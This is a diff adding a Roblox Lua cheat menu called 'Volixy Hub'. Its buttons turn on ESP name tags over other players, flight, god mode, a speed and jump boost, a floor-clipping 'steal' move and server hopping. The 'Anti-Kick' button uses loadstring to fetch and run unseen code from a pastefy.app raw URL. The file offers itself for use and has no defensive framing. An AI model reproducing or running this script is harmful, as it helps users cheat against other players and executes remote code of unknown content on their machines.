@@ -1,0 +1,222 @@
+local Plr, Plrs, RS, TS, TService, Http, UIS = game:GetService("Players").LocalPlayer, game:GetService("Players"), game:GetService("RunService"), game:GetService("TweenService"), game:GetService("TeleportService"), game:GetService("HttpService"), game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+-- UI Builder
+local function Btn(parent, txt, pos, callback)
+    local b = Instance.new("TextButton", parent)
+    b.Size, b.Position, b.Text = UDim2.new(1, 0, 0, 40), pos, txt
+    b.BackgroundColor3 = Color3.fromRGB(25,25,25)
+    b.TextColor3, b.Font, b.TextSize = Color3.new(1,1,1), Enum.Font.GothamBold, 14
+    local uic = Instance.new("UICorner", b) 
+    uic.CornerRadius = UDim.new(0,12)
+    b.MouseEnter:Connect(function() 
+        TS:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(138, 43, 226)}):Play() 
+    end)
+    b.MouseLeave:Connect(function() 
+        if not b:GetAttribute("Hovered") then 
+            TS:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(25,25,25)}):Play() 
+        end 
+    end)
+    if callback then 
+        b.MouseButton1Click:Connect(function() 
+            print(b.Text .. " toggled on")
+            callback(b) 
+        end) 
+    end
+    return b
+end
+
+-- GUI Setup
+local GUI = Instance.new("ScreenGui", Plr:WaitForChild("PlayerGui"))
+GUI.Name = "VolixyHub"
+GUI.ResetOnSpawn = false
+
+local Main = Instance.new("Frame", GUI)
+Main.Size, Main.Position, Main.BackgroundColor3 = UDim2.new(0, 300, 0, 440), UDim2.new(0, 20, 0, 20), Color3.new(0,0,0)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
+Main.Active = true
+Main.Draggable = false
+
+-- Title Bar
+local Title = Instance.new("TextLabel", Main)
+Title.Size, Title.Position, Title.Text = UDim2.new(1, -60, 0, 40), UDim2.new(0, 0, 0, 0), "🌺Volixy Hub🌺"
+Title.Font, Title.TextSize, Title.TextColor3, Title.BackgroundTransparency = Enum.Font.GothamBold, 18, Color3.new(1,1,1), 1
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local VersionLabel = Instance.new("TextLabel", Main)
+VersionLabel.Size = UDim2.new(0, 60, 0, 40)
+VersionLabel.Position = UDim2.new(1, -60, 0, 0)
+VersionLabel.Text = "v2.5"
+VersionLabel.Font = Enum.Font.GothamBold
+VersionLabel.TextSize = 14
+VersionLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+VersionLabel.BackgroundTransparency = 1
+VersionLabel.TextXAlignment = Enum.TextXAlignment.Right
+
+-- DRAG SYSTEM (mobile + pc)
+local dragging = false
+local dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    Main.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+local function onInputBegan(input)
+    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end
+
+local function onInputChanged(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
+        update(input)
+    end
+end
+
+Title.InputBegan:Connect(onInputBegan)
+UIS.InputChanged:Connect(onInputChanged)
+
+-- Minimize / Close Button
+local CloseBtn = Instance.new("TextButton", Main)
+CloseBtn.Size, CloseBtn.Position, CloseBtn.Text = UDim2.new(0, 40, 0, 40), UDim2.new(1, -40, 0, 0), "-"
+CloseBtn.Font, CloseBtn.TextSize, CloseBtn.TextColor3, CloseBtn.BackgroundColor3 = Enum.Font.GothamBold, 18, Color3.new(1,1,1), Color3.fromRGB(138, 43, 226)
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
+
+local minimized = false
+
+-- Content
+local Content = Instance.new("Frame", Main)
+Content.Size, Content.Position, Content.BackgroundTransparency = UDim2.new(1, -20, 1, -60), UDim2.new(0, 10, 0, 50), 1
+
+CloseBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        Content.Visible = false
+        CloseBtn.Text = "+"
+        Main.Size = UDim2.new(0, 300, 0, 50)
+    else
+        Content.Visible = true
+        CloseBtn.Text = "-"
+        Main.Size = UDim2.new(0, 300, 0, 440)
+    end
+end)
+
+-- Feature States
+local espOn, espData, floatOn, floatForce, godOn, godConn, boostOn = false, {}, false, nil, false, nil, false
+
+-- Functions
+local function ToggleESP()
+    espOn = not espOn
+    if espOn then
+        for _, p in pairs(Plrs:GetPlayers()) do
+            if p ~= Plr and p.Character and p.Character:FindFirstChild("Head") then
+                local esp = Instance.new("BillboardGui", CoreGui)
+                esp.Adornee, esp.AlwaysOnTop, esp.Size, esp.StudsOffset = p.Character.Head, true, UDim2.new(0,100,0,40), Vector3.new(0,3,0)
+                local txt = Instance.new("TextLabel", esp)
+                txt.Size, txt.Text, txt.TextColor3, txt.TextScaled, txt.Font, txt.BackgroundTransparency = UDim2.new(1,0,1,0), p.Name, Color3.new(1,1,1), true, Enum.Font.GothamBold, 1
+                espData[p] = esp
+            end
+        end
+    else
+        for _,v in pairs(espData) do if v then v:Destroy() end end
+        espData = {}
+    end
+end
+
+local function ToggleFloat()
+    local hrp = Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    if floatOn and floatForce then
+        floatForce:Destroy()
+        floatForce = nil
+        floatOn = false
+    else
+        floatForce = Instance.new("BodyVelocity", hrp)
+        floatForce.Velocity, floatForce.MaxForce = Vector3.new(0, 20, 0), Vector3.new(0, math.huge, 0)
+        floatOn = true
+    end
+end
+
+local function ToggleGod()
+    local hum = Plr.Character and Plr.Character:FindFirstChild("Humanoid")
+    if not hum then return end
+    if godOn then
+        if godConn then godConn:Disconnect() end
+        hum.MaxHealth, hum.Health = 100, 100
+    else
+        hum.MaxHealth, hum.Health = math.huge, math.huge
+        godConn = hum.HealthChanged:Connect(function()
+            if godOn then hum.Health = math.huge end
+        end)
+    end
+    godOn = not godOn
+end
+
+local function Steal()
+    local root = Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    for i = 1, 20 do
+        root.CFrame = root.CFrame + Vector3.new(0, -15, 0)
+        RS.Heartbeat:Wait()
+    end
+end
+
+local function Hop()
+    local succ, servers = pcall(function()
+        return Http:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data
+    end)
+    if succ then
+        for _, s in ipairs(servers) do
+            if s.playing < s.maxPlayers and s.id ~= game.JobId then
+                TService:TeleportToPlaceInstance(game.PlaceId, s.id)
+                break
+            end
+        end
+    end
+end
+
+local function AntiKick()
+    pcall(function() loadstring(game:HttpGet("https://pastefy.app/dAjYZBnq/raw"))() end)
+end
+
+local function ToggleBoost(button)
+    local char = Plr.Character
+    if char and char:FindFirstChild("Humanoid") then
+        local hum = char.Humanoid
+        if boostOn then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+            button.Text = "⚡ BOOST"
+            button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        else
+            hum.WalkSpeed = 70
+            hum.JumpPower = 100
+            button.Text = "⚡ BOOST ON"
+            button.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+        end
+        boostOn = not boostOn
+    end
+end
+
+-- Buttons (Freecam button removed)
+Btn(Content, "🔮 FLOAT", UDim2.new(0, 0, 0, 0), ToggleFloat)
+Btn(Content, "⚡ GOD MODE", UDim2.new(0, 0, 0, 45), ToggleGod)
+Btn(Content, "💰[NEW] STEAL", UDim2.new(0, 0, 0, 90), Steal)
+Btn(Content, "🛡️ ANTI-KICK", UDim2.new(0, 0, 0, 135), AntiKick)
+Btn(Content, "🧠 ESP", UDim2.new(0, 0, 0, 225), ToggleESP)
+Btn(Content, "🏃‍♂️ BOOST", UDim2.new(0, 0, 0, 270), ToggleBoost)
+Btn(Content, "🔄 SERVER HOP", UDim2.new(0, 0, 0, 315), Hop)
